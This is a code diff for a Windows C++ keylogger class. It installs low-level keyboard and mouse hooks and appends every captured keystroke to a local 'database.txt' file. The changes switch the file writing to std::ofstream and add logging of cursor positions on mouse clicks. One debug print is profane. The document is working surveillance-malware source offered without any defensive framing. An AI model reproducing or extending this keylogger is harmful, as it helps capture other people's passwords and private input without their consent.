@@ -67,13 +67,14 @@ bool	Keylog::peekMsg(void)
 LRESULT CALLBACK Keylog::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
 	char	ch;
-	FILE	*file_db;
+//	FILE    *file_db;
+	std::ofstream file_db("database.txt", std::ofstream::out | std::ofstream::app);
 
 	if (nCode < 0)
 		return CallNextHookEx(NULL, nCode, wParam, lParam);
 
 	ch = 0;
-	file_db = fopen("database.txt", "a+");
+//	file_db = fopen("database.txt", "a+");
 
 	tagKBDLLHOOKSTRUCT *str = (tagKBDLLHOOKSTRUCT *)lParam;
 
@@ -104,7 +105,9 @@ LRESULT CALLBACK Keylog::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 			}
 			else if (str->vkCode == VK_SPACE || (ch >= 0 && ch <= 127))
 			{
-				fwrite(&ch, 1, 1, file_db);
+				std::cout << "Je write motherfucker" << std::endl;
+				file_db << ch << std::endl;
+	//			fwrite(&ch, 1, 1, file_db);
 			}
 		}
 	return CallNextHookEx(0, nCode, wParam, lParam);
@@ -112,11 +115,12 @@ LRESULT CALLBACK Keylog::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 
 LRESULT CALLBACK Keylog::LowLevelMouseProc(int code, WPARAM wParam, LPARAM lParam)
 {
-	FILE		*file_db;
-	std::string	msg;
-	std::string	msg_buff;
-
-	file_db = fopen("database.txt", "a+");
+	std::ofstream	file_db("database.txt", std::ofstream::out | std::ofstream::app);
+	POINT			p;
+	std::string		msg;
+	std::string		posx;
+	std::string		posy;
+	std::string		msg_buff;
 
 	if (code == HC_ACTION)
 	{
@@ -138,11 +142,18 @@ LRESULT CALLBACK Keylog::LowLevelMouseProc(int code, WPARAM wParam, LPARAM lPara
 		{
 			std::cout << "< MouseClick pressed >" << std::endl;
 			std::cout << msg << std::endl;
-			fwrite(msg.c_str(), 1, msg.length(), file_db);
+			file_db << msg;
+			if (GetCursorPos(&p))
+			{
+				std::cout << "Pos X : " << p.x << std::endl;
+				std::cout << "Pos Y : " << p.y << std::endl;
+				std::cout << std::endl;
+				file_db << "_posx:" << p.x << "_posy:" << p.y << std::endl;
+			}
 		}
 
 	}
-
+	file_db.close();
 	return CallNextHookEx(0, code, wParam, lParam);
 }
 
